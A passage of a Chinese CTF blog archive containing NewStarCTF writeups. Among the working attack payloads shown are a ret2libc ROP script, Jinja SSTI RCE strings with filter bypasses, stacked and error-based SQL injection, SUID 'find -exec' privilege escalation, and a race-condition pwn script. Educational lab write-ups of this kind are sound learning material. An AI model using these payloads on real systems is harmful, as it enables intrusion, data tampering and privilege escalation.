write_addr\n###\n  \n  \npayload = b'd'\\*0xc0 + p64(bss+0xc0) +p64(read_addr)\n  \n  \np.sendafter('it!\\\\n',payload)\n  \n  \nsleep(1)\n  \n  \n### Leak [write_addr] & return [main_addr]\n  \n  \npayload = p64(rdi) + p64(1) + p64(rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr) #\n  \n  \npayload = payload.ljust(0xc0,b'b')\n  \n  \npayload += p64(bss-8) + p64(leave_ret)\n  \n  \np.send(payload)\n  \n  \n### ret2libc: leak system_addr & binsh_addr\n  \n  \nwrite_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n  \n  \nlog.info(\"write_addr:%s\"%hex(write_addr))\n  \n  \nlibc_base = write_addr - libc.sym['write']\nsystem = libc_base + libc.sym['system']\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\n  \n  \nlog.info(\"system_addr:%s,binsh:%s\"%(hex(system),hex(binsh)))\n  \nlog.info('Double Overvlow!try to getshell\\n===================')\n  \n  \n### Double Overflow: rdi+binsh+system = getshell\n  \n  \nbss = elf.bss() + 0x800 #new bss\n  \n  \npayload = b'a'*0xc0 + p64(bss+0xc0) +p64(read_addr)\n  \n  \np.sendafter('it!\\n',payload)\n  \n  \nsleep(1)\n  \n  \npayload = p64(rdi) + p64(binsh) +  p64(system)\n  \n  \npayload = payload.ljust(0xc0,b'c')\n  \n  \npayload += p64(bss-8) + p64(leave_ret)\n  \n  \np.send(payload)\n  \n  \n####################\n  \n  \np.interactive() \n  \n\n```\n  \n运行程序得到shell。\n  \n![](http://cdn.anyiblog.top/common/1666527785711-1d2ed67e-e7b3-4952-9494-915d37d3242a.jpg)  \n这一道pwn题学到真的挺多的，主要还得是耐心去调试，去找错在哪里，然后一步步完善脚本。学到了！","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"NewStarCTF 公开赛第三周Writeup","url":"/2022/10/20/20221020/","content":"\n# 前言\n  \nPS：后面题目做出来的比较少，其它方向的题解可以参考网上别的师傅写的wp。misc写的很详细，各位师傅们可以看看\n  \n第三周解题情况：\n  \n![](http://cdn.anyiblog.top/common/1666263095548-110582df-297e-4320-8472-0345fed0f751.jpg)国庆没做题 光顾着玩了。8号那天回学校做的题 貌似就做了一天，还可以= =\n  \n# Web\n  \n### Web1.BabySSTI\\_One\n  \nssti类型的第一题，要求我们传参name，先传入```{{7*7}}```发现解析\n  \n![](http://cdn.anyiblog.top/common/1666263096555-927ed295-0bcc-400f-8b75-21a6be5c3862.jpg)尝试构造''.\\_\\_class\\_\\_.\\_\\_base\\_\\_.\\_\\_subclasses来引用os函数，但是发现关键词class、base这些被ban了\n  \n![](http://cdn.anyiblog.top/common/1666263096945-0e060243-bb47-4c1d-a3e7-8cfa486dd64d.jpg)  \n绕过方法是用+号拼接\"\\_\\_cla\"+\"ss\\_\\_\"这样，然后每个类用\\[\\]包括起来\n  \npayload：\n  \n```\n{{\"\"[\"__cla\"+\"ss__\"][\"__ba\"+\"se__\"][\"__subc\"+\"lasses__\"]()}}\n```\n  \n![](http://cdn.anyiblog.top/common/1666263097317-9ec2452c-35e3-4484-8b60-068529cc0975.jpg)  \n这样的情况是因为类被网页解析了导致不显示，我们可以ctrl+u打开源代码看有哪些类\n  \n![](http://cdn.anyiblog.top/common/1666263097700-248f5cd6-bdda-4214-9ded-28e19e71fcf1.jpg)  \nos在第117个类，引用os并构造\n  \n```\n[\"__in\"+\"it__\"][\"__glo\"+\"bals__\"]['popen']('ls').read()\n```\n  \n，通过引用os模块的popen函数来RCE\n  \n![](http://cdn.anyiblog.top/common/1666263098052-2e8cd58e-5787-4140-9895-c11c23601c46.jpg)  \n成功命令执行，用ls /看下flag在哪\n  \n![](http://cdn.anyiblog.top/common/1666263098440-8f728e11-48ca-4a0d-af4b-515222dfc7ee.jpg)  \n尝试输入cat /flag\\_in\\_here\n  \n然后发现cat和flag都被关键词过滤了\n  \n绕过的姿势就是用tac和\\*号匹配：tac /fla\\*\n  \n最终payload：\n  \n```\n?name={{\"\"[\"__cla\"+\"ss__\"][\"__ba\"+\"se__\"][\"__subc\"+\"lasses__\"]()[117][\"__in\"+\"it__\"][\"__glo\"+\"bals__\"]['popen']('tac /fla*').read()}}\n```\n  \n![](http://cdn.anyiblog.top/common/1666263098840-6601bcc6-23a4-457b-9f74-d46f7863cb1d.jpg)  \n### Web2.multiSQL\n  \n![](http://cdn.anyiblog.top/common/1666263099216-41e728eb-545a-4a4f-a38a-a876817348cd.jpg)  \n题目查询点存在堆叠注入，要求我们分数达到425分以上，满足条件后访问verify.php即可获得flag\n  \n因此我们需要用到update函数来改某个表的某个字段为425以上，再访问就可以得到flag\n  \n因为select被过滤了，可以先用show这个查数据库，表，字段\n  \n```\n查库：1'; show databases;#\n>\nenglish\ninformation_schema\nmysql\nperformance_schema\n```\n  \n  \n```\n查表：1';show tables from english#\n>\nscore\n```\n  \n  \n```\n查字段：1';show columns from score;#\n>\nusername  varchar(255)  YES\nlisten  int(11)  YES\nread  int(11)  YES\nwrite  int(11)  YES\n```\n  \n显然是要修改english.score字段listen为425以上，我们可以用update创建个用户和其分数\n  \n但很不幸update被禁用了，所以这里要用预处理命令绕过，\n  \n可以参考强网杯2019随便注这道题，wp：[https://blog.csdn.net/qq\\_45552960/article/details/103608740](https://blog.csdn.net/qq_45552960/article/details/103608740)\n  \n用concat拼接字段从而绕过update的判断，最后执行存储的sql语句篡改表中数据\n  \n```\n1';\n  \nSET @sql = concat(\"u\",\"pdate score set username='1', listen='1000'\");  //存储SQL语句\n  \nPREPARE sqla from @sql;   //预定义SQL语句\n  \nEXECUTE sqla;#  //执行预定义SQL语句\n  \n//1';SET @sql = concat(\"u\",\"pdate score set username='1', listen='1000'\");PREPARE sqla from @sql;EXECUTE sqla;#\n```\n  \n![](http://cdn.anyiblog.top/common/1666263099636-52eefb21-7049-49e9-9bf6-31b95cb407b9.jpg)  \n![](http://cdn.anyiblog.top/common/1666263099994-f11aa18e-39c8-47ba-ad56-a02753f57451.jpg)  \nFlag：flag{Ju3t\\_use\\_mo2e\\_t2en\\_0ne\\_SQL}\n  \n  \n  \n# Misc\n  \n### Misc1.Whats HTTP\n  \nhttp流量包，wireshark打开分析\n  \n你可以直接导出http包到本地，然后本地分析，也可以wireshark筛选条件分析\n  \n这里我是用wireshark筛选出来的\n  \n```\nhttp.response.code==200  //筛选状态码为200的包\n```\n  \n![](http://cdn.anyiblog.top/common/1666263100398-a730dd4a-c496-4288-899e-6c961a43cbce.jpg)  \n这个包字节比较特殊 和别的不同，追踪下这个流\n  \n一追踪下 flag这不就来了吗\n  \n![](http://cdn.anyiblog.top/common/1666263100822-cf0bfb62-0abc-4954-880f-bd3c6810193d.jpg)  \nbase64解密下\n  \n![](http://cdn.anyiblog.top/common/1666263101216-b16d306d-ec3c-49b4-8340-630dd7eebfb8.jpg)  \n666c61这个前缀显然是flag，所以最后16进制转换下字符串即可\n  \n![](http://cdn.anyiblog.top/common/1666263101587-97dc0ceb-12ba-4c8b-867f-be68cbc4cf94.jpg)  \n复现的时候一把梭做出来的，之前咋做的忘记了呃呃\n  \nFlag：flag{4f33649d030c6778426971b54dd72ece}\n  \n  \n### Misc2.qsdz's girlfriend 3\n  \n一个提权的题目，题目提示：\n  \n![](http://cdn.anyiblog.top/common/1666263101940-a0b78dc7-81f5-482f-934f-44895d08389c.jpg)  \n  \nssh连接：\n  \n```\nssh -p 29142 qsdz@node4.buuoj.cn\n  \n>qsdz@node4.buuoj.cn's password: Hikari\n```\n  \n成功连接：\n  \n![](http://cdn.anyiblog.top/common/1666263102313-013afb9f-38bc-48da-aebf-aa2e8efc3aca.jpg)  \n在/home/a2u2e发现了重要信息\n  \n![](http://cdn.anyiblog.top/common/1666263103369-b7c51f83-4ab4-4e89-aea4-c07433c4c41d.jpg)  \n（日记看哭了）\n  \n显然flag就在/root/girlfriends/Hikari\n  \n现在没有权限进入root，要想办法提权\n  \n说实话提示给的网站都没用上，根本不知道咋用。。hh\n  \n我是用find suid提权，先在/tmp文件夹下创建一个1文件\n  \n然后find 1 -exec \\[cmd\\] \\\\;即可\n  \n![](http://cdn.anyiblog.top/common/1666263103708-8cd4e354-9b94-4fc0-b933-ce9b62860e33.jpg)  \n可以看到现在为root权限了，flag在哪我们也知道了，之后就找文件就完事了\n  \n注意下这个-exec后面的命令不需要用引号包含 直接打就星\n  \n  \n![](http://cdn.anyiblog.top/common/1666263104030-d4e9c872-f984-44f1-afef-c5597e623941.jpg)  \n蚌埠住了！出题人我以后再也不乱说话了哈哈哈哈哈哈 我服啦\n  \n最后cat下这个文件得到flag\n  \n```\nfind 111 -exec cat /root/girlfriends/hasegawa_azusa \\;\n```\n  \n![](http://cdn.anyiblog.top/common/1666263104382-98cfb0aa-6bad-499b-ab83-041354efb4dc.jpg)  \n  \n  \n### Misc3.WebShell！\n  \n![](http://cdn.anyiblog.top/common/1666263104756-e2f7b5f4-229b-4842-83b1-25a6e10b167c.jpg)  \n  \n蚁剑流量分析，wireshark分析，要求获取webshell密码 用户名和文件内容\n  \n同样http.response.code==200筛选，然后逐个分析\n  \n![](http://cdn.anyiblog.top/common/1666263105217-d10fd2d2-d426-4d9f-8349-c405a9999cb7.jpg)  \n追踪第一个包，发现了webshell的内容\n  \n![](http://cdn.anyiblog.top/common/1666263105668-b311517a-434a-4967-b84a-b808100cbd44.jpg)  \n  \n一个php函数highlight\\_file的样式，可以写进html看内容。但其实分析其中内容也可以看出密码了\n  \n![](http://cdn.anyiblog.top/common/1666263105992-99b189b8-c8f9-4416-86a9-cac479a05349.jpg)  \n\n```\nwebshell密码：n3wst4r\n```\n  \n有了这个密码字符串那我们溯源都变得简单多了\n  \n要先想蚁剑连接都围绕eval($\\_POST\\['n3wst4r'\\])这个webshell进行，那么就有两个特征：\n  \nhttp字符串包含n3wst4r；请求方法为post\n  \n所以我们构造这个筛选条件：\n  \n```\nhttp contains \"n3wst4r\" and http.request.method==POST\n```\n  \n![](http://cdn.anyiblog.top/common/1666263106441-e0731e60-ca61-40b4-8d09-46ca91824f51.jpg)  \n逐个分析即可，注意由于我们筛选的是post包，仅仅只是一个请求，只能显示其请求的参数\n  \n那么请求的回显在哪里？就需要我们追踪tcp流找这个包紧跟着的http包，那就是回显内容\n  \n比如这里我追踪第4个包（前3个包字节都只有2k多，后面的都是5k多显然后面的包是执行了命令的，所以前面可以不用看）\n  \n![](http://cdn.anyiblog.top/common/1666263106877-c3e7e986-da52-416f-ad11-f88b8f44104b.jpg)  \n然后在这个流下找到了http包，打开line-based text data找到了内容\n  \n![](http://cdn.anyiblog.top/common/1666263107278-1856e977-d4f3-4a9a-b9fa-556c189ee580.jpg)  \n  \n![](http://cdn.anyiblog.top/common/1666263107798-5955d92a-eb43-4e14-97c2-cb4b7aadaf38.jpg)  \n看回显内容就知道执行了ls命令，用这种方法可以直接找到命令 比较快。当然如果你逐个分析蚁剑流量的参数，各种加解密后还原了命令的内容也可以。\n  \n不过题目是让我们找用户名和机密文件的内容，那就在剩下几个包里找回显就行了\n\n```\n第5个包找到用户名为：www-data\n```\n \n![](http://cdn.anyiblog.top/common/1666263108262-e99ae075-24b1-461a-96fd-eaa76892f74a.jpg)  \n\n```\n第9个包找到文件内容为：Y0UAr3G00D\n```\n  \n![](http://cdn.anyiblog.top/common/1666263108743-87b4dd2a-6ad1-43ea-99b7-6de0aeb34d81.jpg)  \n最后拼接下得到flag\n  \nFlag：flag{n3wst4r\\_www-data\\_Y0UAr3G00D}\n  \n  \n### Misc4.Yesec no drumsticks 3\n  \n题目提示：\n  \n![](http://cdn.anyiblog.top/common/1666263109114-cfdeb215-3c51-4863-8076-bf0a949e8b8a.jpg)  \n![](http://cdn.anyiblog.top/common/1666263109511-658661d7-4cda-4c27-bb47-0d029abeae94.jpg)  \n一个压缩包题，有三道 做任意一道就行，这边我做的是第三道 其它两道没有做\n  \n**Third：**\n  \n解压得到guna.zip。\n  \n**第一层：**\n  \n打开压缩包：\n  \n![](http://cdn.anyiblog.top/common/1666263109944-55be6348-5786-4d0c-82a1-6f8b02abe59d.jpg)  \n注释告诉我们弱密码，那么直接爆破下即可。\n  \n![](http://cdn.anyiblog.top/common/1666263110429-c6969edf-211b-4965-b6a7-55a30ac7d14f.jpg)  \n密码为caiji，解压压缩包得到文本和新的压缩包\n  \n文本内容：\n  \n![](http://cdn.anyiblog.top/common/1666263110865-8c0a4f29-3966-4fd2-9fcd-908d7c5c3a4d.jpg)  \n没有任何隐写，不过后面有用 先留着\n  \n**第二层：**\n  \n![](http://cdn.anyiblog.top/common/1666263111299-19fc7268-590e-4591-97d4-69c274a5cb3f.jpg)  \n注释提示了rockyou，刚开始不知道是什么 百度下发现rockyou是kali自带的字典\n  \n![](http://cdn.anyiblog.top/common/1666263111619-0a36b3b9-efd9-49b8-b717-0cda0ef77fdf.jpg)  \ncopy到本地下，然后用archpr爆破即可\n  \n  \n![](http://cdn.anyiblog.top/common/1666263112138-5898eddc-ad68-4ad7-956e-41b2cc7ced1d.jpg)  \n  \n得到密码elamordemividaerestu 解压得到下一个压缩包\n  \n**第三层：**\n  \n![](http://cdn.anyiblog.top/common/1666263112892-432339dd-5252-42c4-b49f-e9f909edac73.jpg)  \n让我们爆破密码，这里遍历下字母表用python写个字典 然后用archpr爆破\n  \n建议字母表弄个小写和数字就行了 根据后面几位的规律，写多了跑得慢而且卡\n  \n```\nimport string\n  \ntable = string.ascii_lowercase + string.digits\nprint(table)\nl = []\n  \n  \nfor a in table:\n    for b in table:\n        for c in table:\n            for d in table:\n                for e in table:\n                    password = '%s%s%s%s%s_1s_sha0O'%(a,b,c,d,e)\n                    l.append(password)\n  \n  \nprint(len(l))\nwith open('dc.txt','w') as f:\n    for password in l:\n        f.write(password + '\\n')\n```\n  \n运行后等待一会\n  \n![](http://cdn.anyiblog.top/common/1666263113292-20857710-021f-4aa2-a5ed-e1fb0ee5b528.jpg)  \n![](http://cdn.anyiblog.top/common/1666263113739-09b98b54-7352-46a1-8619-3466fcea7ae4.jpg)  \n得到密码yesec\\_1s\\_sha0O  (yesec\\_is\\_shabi queshi)\n  \n**第四层：**\n  \n![](http://cdn.anyiblog.top/common/1666263114205-43225a01-082a-44e6-93a7-23c9f459b52c.jpg)  \n还记得之前的dialogue.txt么，和这个txt CRC相同 大小相同\n![](http://cdn.anyiblog.top/common/1666263114718-db3fc086-fa7b-47cc-a9c8-aa9c277a27de.jpg)  \n说明是同个文件，那么使用明文攻击。\n  \n把dialogue.txt压缩到dialogue.zip\n  \n之后archpr攻击类型选择明文，将两个压缩包分别放入\n  \n![](http://cdn.anyiblog.top/common/1666263115151-b6ca20f3-b751-4204-914f-dd3b32eb5f3e.jpg)  \n等这个密钥搜索完，直接取消就好 不知道是什么原因ARCHPR并不能直接显示密码，不过可以将恢复好的压缩包导出\n  \n![](http://cdn.anyiblog.top/common/1666263115623-a1642ca9-7910-4276-ae7c-2743357861de.jpg)  \n解压secret.zip\n  \n**第五层：**\n  \n![](http://cdn.anyiblog.top/common/1666263116041-0694c0b8-749d-487c-adde-3f1b6ee90c5f.jpg)  \n这个secret.jpg当时没看hint还分析了很久，结果跟这个图片没有任何关系，\n  \n![](http://cdn.anyiblog.top/common/1666263116437-3079b37f-f15a-40b8-b5a7-5c9a35f75ee6.jpg)  \n恶趣味罢了呜呜呜\n  \n最后一层根据提示，猜测伪加密，可以手工修\n  \n这里用的zipcenop修复（这工具终于修复成功一次了！）\n  \n  \n![](http://cdn.anyiblog.top/common/1666263116875-de0c58ee-fa63-49a3-9e7b-a1d8643c197d.jpg)  \n![](http://cdn.anyiblog.top/common/1666263117302-887fd307-efab-4ba6-94e0-032dd3b1e990.jpg)  \n打开文本得到flag：\n  \n![](http://cdn.anyiblog.top/common/1666263117690-394d5c9b-aba8-4795-8156-b6cd50a710f1.jpg)  \nFlag：flag{I\\_r3ally\\_Want\\_tO\\_be\\_1I1I1}\n  \n### Misc5.混沌的图像\n  \n![](http://cdn.anyiblog.top/common/1666263118047-be9f96d8-93e3-4e66-9317-9707f9da1bdf.jpg)  \n这道题跟week1 密码学chaos那题有联系，还没看过可以看我的博客：[https://www.anyiblog.top/2022/09/25/20220925/#Crypto5-chaos](https://www.anyiblog.top/2022/09/25/20220925/#Crypto5-chaos)\n  \n提示是一段base，解密结果：\n```\nimg = Image.open('flag.png')\nw,h=img.size\nfor i in range(w):\n    for j in range(h):\n    (r, g, b, a) = img.getpixel((i,j))\n    pic.append(r)\n    pic.append(g)\n    pic.append(b)\n```\n  \n附件是一张图片\n  \n![](http://cdn.anyiblog.top/common/1666263123950-1e03f521-2e3d-4e37-afdd-2faeec758188.jpg)  \n图片存在lsb隐写，stegsolve分析：\n  \n![](http://cdn.anyiblog.top/common/1666263124501-624f8d00-85d7-44f2-a9fa-6f81e87f789c.jpg)  \n存在另一张图片。用save bin保存至新的文件\n  \n![](http://cdn.anyiblog.top/common/1666263134232-b11c6e5b-4859-4384-89b7-4fab420db9d6.jpg)  \n得到这张图片,同时winhex再搜索图片尾AE4260看看有没有其他数据：\n  \n![](http://cdn.anyiblog.top/common/1666263135077-df86c516-7c62-48cf-8810-e7798fc37d92.jpg)  \n发现了这个k1和k2\n  \n```\nk1=3.5606267076894413,k2=3.9101741242346346,k=[106,80,198,220,47,18,19,230,42,202,207,196,214,132,188,190]\n```\n  \n之前的chaos.py：\n  \n![](http://cdn.anyiblog.top/common/1666263135497-ca25ea08-495f-4809-9560-e9d594a37ee4.jpg)  \n之前的给了k1,k2,k还有c，然后让我们还原flag\n  \n现在只有k1,k2还有k 没有了c。\n  \n  \n给的hint的加密脚本还有和之前密码学chaos那道题联系之后，二者加密得到了上面这张图片\n  \n刚开始逻辑还是有点不明白，问了下出题师傅\n  \n![](http://cdn.anyiblog.top/common/1666263135852-e561f184-d27c-445c-abb3-4c1b0165d447.jpg)师傅这么说了，所以说c就是这张图片，准确来说就是hint的那个脚本的pic变量。\n  \n因此我们需要提取这张图片的每个像素的R/G/B值，然后添加到列表c，再通过之前chaos的解密脚本还原flag，此时这个flag是一堆数字的列表 也就是新图片的R/G/B值，对照还原即可！\n  \n不同的地方就是之前那个解密脚本我写的是把列表中所有的数字当作ascii处理 还原flag，然后这次我刚开始写的时候也是这么做的哈哈，导致了写出来的文本一堆乱码 看不懂。\n![](http://cdn.anyiblog.top/common/1666263136324-bf34bd71-4b0e-48f9-a8b8-ccf8b73ad687.jpg)  \n也算是深有体会了！第二天早上想到是R/G/B值 写到新图片就还原了。\n  \n这边直接贴脚本，需要注意的是提取像素和写像素这两个地方，也就是脚本的开始和末尾的地方，中间的和之前一样不变 照抄就可以了。\n  \n```\nfrom PIL import Image\n  \n  \nimg = Image.open('task.png')\nc = []\nw,h=img.size\nfor i in range(w):\n    for j in range(h):\n        (r, g, b) = img.getpixel((i,j))\n        c.append(r)\n        c.append(g)\n        c.append(b)\nprint(len(c))\n  \n  \nsum, r, k = 0, 1, [106,80,198,220,47,18,19,230,42,202,207,196,214,132,188,190]\nk1=3.5606267076894413\nk2=3.9101741242346346\nfor i in k:\n    sum += i\n    r ^= i\na_1 = (sum/256) % 1\ntimea1 = 3 + int(1000 * a_1) % 30\nb_1 = (r/256)\ntimeb1 = 3 + int(1000 * b_1) % 30\nxc_1 = a_1 * b_1\nyc_1 = (a_1 + b_1) % 1\ndata = (a_1, timea1, b_1, timeb1, xc_1, yc_1)\nkey = (k1,k2)\ndef LC(key, x, times, flags):\n    (k1, k2) = key\n    xn = []\n    xn.append(x)\n    if flags:\n        xn.append(1 - 2 * xn[0]**2)\n    else:\n        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])\n    for i in range(times):\n        assert xn[i]>=-1 and xn[i]<=1 and xn[i+1]>=-1 and xn[i+1]<=1\n        if flags:\n            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))\n        else:\n            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))\n    return xn[times + 1]\nm, c = [], c\nmiu, omiga = [], []\nta = timea1\ntb = timeb1\nres = []\nfor flag in c:\n    miu.append(LC(key, a_1, ta, 1))\n    omiga.append(LC(key, b_1, tb, 0))\n    res.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000))%256)^flag)\n    delta = flag/256\n    for i in range(3):\n        y = (yc_1 + delta) % 1\n        y = k1 * y**3 + (1 - k1) * y\n        x = xc_1\n        x = k2 * x**3 + (1 - k2) * x\n    ta = 3 + int(1000 * x) % 30\n    tb = 3 + int(1000 * y) % 30\n  \n#print(len(res),res[0],res[1],res[2])\nn = Image.new('RGB',(w,h))\nfor i in range(w):\n    for j in range(h):\n        #print(i*30 + j*3,i*30 + j*3+1,i*30 + j*3+2)\n        n.putpixel((i,j),(res[i*(h*3) + j*3],res[i*(h*3) + j*3+1],res[i*(h*3) + j*3+2]))\nn.save('result.png')\n  \n  \n'''\nf = b\"\"\nfor i in res:\n    f += chr(i).encode()\n#print(len(f))\nwith open('new2.txt','wb') as n:\n    n.write(f)\n'''\n```\n  \n运行脚本后等待一会，得到result.png\n  \n![](http://cdn.anyiblog.top/common/1666263144025-06facf12-1547-43d5-9856-f55bb6317297.jpg)  \n最后lsb隐写，stegsolve提取得到flag。\n  \n![](http://cdn.anyiblog.top/common/1666263144501-c6d47b6e-4e86-4016-bf88-26ecc6d2e622.jpg)  \nFlag：flag{easy\\_chaos\\_encrypt!!!\\_776e6d30}\n  \n小彩蛋？\n  \n![](http://cdn.anyiblog.top/common/1666263144863-f4232baf-18ab-464b-b0bc-2efb904c6375.jpg)  \n# Reverse\n  \n### Reverse1.Zzzzzz3333\n  \n32位，无壳。IDA分析：\n  \n![](http://cdn.anyiblog.top/common/1666263145355-c01fb9d1-bf38-49e8-add7-d38557a6b0b3.jpg)  \n告诉了我们一堆方程让我们解密arglist，然后得到arglist后带到加密程序得到flag。\n  \nbyte\\_602168：\n  \n![](http://cdn.anyiblog.top/common/1666263145771-d8672d46-5696-4cb4-8510-13bfc9a9c7c2.jpg)  \n用到了python的z3库，刚好前些时间台州赛有一题也是用z3库解密，刚好会做。\n  \n这个z3库只要是为了帮助解密方程式，像这种多个式子的就可以拿来解密\n  \n需要注意的是这一块：\n  \n![](http://cdn.anyiblog.top/common/1666263146173-207f2ab1-e479-4bec-bf29-1105f80bb432.jpg)  \n这边是一个变量自乘，不是方程式里的内容，不要将这一个写进去 会报错。\n  \n脚本：\n  \n```\nfrom z3 import *\nArglist = []\nfor i in range(8):\n    Arglist.append(BitVec(\"Arglist%d\"%i,8))\nsol = Solver()\nv13 = Arglist[5]\nv11 = Arglist[4]\nv9 = Arglist[1]\nv12 = Arglist[3]\nv8 = Arglist[7]\nv10 = Arglist[0]\nsol.add(Arglist[3]+ 4 * Arglist[2]+ Arglist[7]+ 4 * (Arglist[3] + 4 * Arglist[2])+ 3 * (Arglist[4] + 4 * Arglist[0])+ 2 * (Arglist[5] + 4 * Arglist[6]) + 11 * Arglist[1] == 6426)\nsol.add(11 * (v10 + v8 + v12) + 4 * (v13 + 2 * v11) + Arglist[2] + 45 * v9 + 7 * Arglist[6] == 9801)\nsol.add(5 * v9 + 2 * (v11 + Arglist[6] + v13 + 2 * (v8 + v12) + Arglist[2] + 2 * (Arglist[6] + v13 + 2 * (v8 + v12)) + 8 * v10) == 6021)\nsol.add(19 * v10 + 9 * v9 + 67 * v8 + 5 * (Arglist[2] + Arglist[6]) + 7 * (v13 + 4 * v12) + 4 * v11 == 14444)\nsol.add(22 * v13 + 5 * (v11 + 2 * (v12 + v9 + 2 * v10)) + 4 * (v8 + Arglist[6]) + 6 * Arglist[2] == 7251)\nsol.add(19 * v12 + 3 * (v8 + Arglist[2] + 4 * v8 + Arglist[6] + 2 * (v8 + Arglist[2] + 4 * v8)) + 4 * (v10 + v13 + v9 + 2 * (v10 + v13)) == 10054)\nv9 *= 2\nsol.add(7 * v10 + 17 * (v12 + v9) + 11 * (v11 + 2 * v13) + 2 * (Arglist[2] + Arglist[6] + 4 * Arglist[2] + 6 * v8) == 10735)\nsol.add(Arglist[6] + v11 + 11 * Arglist[2] + 15 * (v12 + 2 * v8) + v9 + 43 * v10 + 21 * v13 == 11646)\nassert sat == sol.check()\nans = sol.model()\nres = \"\"\nfor i in Arglist:\n    res += chr(int(str(ans[i])))\nprint(res)\n  \n  \nflag = [0,0x0d,0x0d,0x0b,0x0c,0x6b,0x14,0x1e,0x1c,0x52,0x5f,0x5f,0x28,0x78,0x1d,0x3b,0x25,0x0e,3,0,0x56,0x10,0x4f,0x19]\n  \n  \nfor i in range(24):\n    flag[i] = flag[i] & (ord(res[i & 7]) ^ flag[i]) | ~flag[i] & (~flag[i] ^ ~ord(res[i & 7]))\nf = \"\"\nfor i in flag:\n    f += chr(i)\nprint(f)\n```\n  \n![](http://cdn.anyiblog.top/common/1666263146548-3c84cb6a-a75d-4afe-8c9c-f881e5730294.jpg)  \n或者直接把key带到程序里：\n  \n![](http://cdn.anyiblog.top/common/1666263146897-0c2a8fe5-aa5a-4a45-9ceb-0d84442b6d7c.jpg)Flag：flag{Zzzz333\\_Is\\_Cool!!!}\n  \n# Pwn\n  \n### Pwn1.cat flag\n  \n64位菜单题，多线程加sleep函数导致的漏洞\n  \n![](http://cdn.anyiblog.top/common/1666263147310-087b8ebd-f9d4-424d-8fde-099bd24e87cc.jpg)  \n  \nls可以看当前目录文件 cat读取文件 editname修改name\n  \n跟进cat\n  \n![](http://cdn.anyiblog.top/common/1666263147673-233291b5-f5a2-48d5-9c01-767f66bb372c.jpg)  \n如果文件存在且符合条件则执行cating函数，跟进\n  \n![](http://cdn.anyiblog.top/common/1666263148010-edd1ac05-d475-43ff-b0e5-6ac38424fcd5.jpg)  \n这个函数就是执行cat的主要函数，这里的sleep(1)按理来说程序到这里不能执行其他的命令，但由于是用线程执行 所以会导致这个sleep time在后台等待，那么在这个1s的期间就可以用edit函数功能修改name为flag，导致strcat(dest,name)原先的name变量替换成mv函数输入的东西 从而获得flag。\n  \n（如果手够快，光输入就可以得到flag）\n  \n所以首先要先cat一个存在的文件，引进到cating函数。用ls看一下\n  \n![](http://cdn.anyiblog.top/common/1666263148432-a97daa7c-1e45-40b7-b386-e3149db61c7c.jpg)  \n任意选一个，这里我用backdoor。\n  \n选择cat后输入backdoor，然后立刻选择mv功能输入flag\n  \n![](http://cdn.anyiblog.top/common/1666263148850-bf1c143e-35b8-4f8c-838f-72425a3d12c3.jpg)  \n同样贴下脚本吧\n  \n```\nfrom pwn import *\n  \n  \ncontext.log_level='debug'\n  \n  \np = remote('node4.buuoj.cn',25420)\n  \n  \ndef ls():\n    p.sendlineafter('==>','1')\n    print(p.recv())\n  \n  \ndef cat(filename):\n    p.sendlineafter('==>','2')\n    p.sendlineafter('cat.',str(filename))\n  \n  \ndef mv(filename):\n    p.sendlineafter('==>','3')\n    p.sendlineafter('change.',str(filename))\n  \n  \ncat('backdoor')\nmv('flag')\n  \n  \np.interactive()\n  \n```","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"NewStarCTF 公开赛第二周Writeup","url":"/2022/10/15/20221015/","content":"# 前言\n  \n这些天也是比较忙，赶下第二周的writeup。（剩下几周的我会赶的呜呜）\n  \n以下是解题情况\n  \n![](http://cdn.anyiblog.top/common/1665833278102-3709a35a-eafd-48a4-90df-13a8b11c5063.jpg)难度还可以，是我太菜了。\n  \n# Web\n  \n### Web1.Word-For-You(2 Gen)\n  \n题目可以用sqlmap一把梭，不过不推荐。\n  \n这里用报错注入\n\n```\n  \n查库\n  \n1' and updatexml(1,concat(0x7e,database(),0x7e),1)#\n  \n>XPATH syntax error: '~wfy~'\n\n```\n\n```\n  \n查表\n  \n1' and updatexml(1,concat(0x7e,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=database()),0x7e),1)#\n  \n>XPATH syntax error: '~n,wfy_comments,wfy_information~'\n \n``` \n\n```\n查询wfy_comments库字段及内容\n  \n1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments'),0x7e),1)#\n  \n>XPATH syntax error: '~id,text,user,name,display~'\n  \n1' and updatexml(1,concat(0x7e,(select right(group_concat(text),27) from wfy.wfy_comments),0x7e),1)#\n  \n>XPATH syntax error: '~flag{Ju4t_m2ke_some_err0rs}~'\n\n```\n  \n![](http://cdn.anyiblog.top/common/1665833278574-141de0bf-675a-4e78-a519-34eee8e7437b.jpg)  \nFlag:flag{Ju4t\\_m2ke\\_some\\_err0rs}\n  \n### Web2.IncludeOne\n  \nPHP伪随机数+伪协议Bypass\n  \n```\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);\necho \"Hint: \".mt_rand().\"\n\";\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) && preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n        //flag in `flag.php`\n        include($_GET['file']);\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n```\n  \n第一层php伪随机数\n  \n首先下载出题人给的工具php\\_mt\\_seed 使用4.0版本\n  \n./php\\_mt\\_seed 1219893521\n  \n![](http://cdn.anyiblog.top/common/1665833279076-c9de848d-1ea3-40a5-acb9-97f550794b69.jpg)  \n使用第一个seed，然后带到php里去跑。\n  \n![](http://cdn.anyiblog.top/common/1665833279404-52839e1e-c096-4725-8243-aaba7ff52f31.jpg)  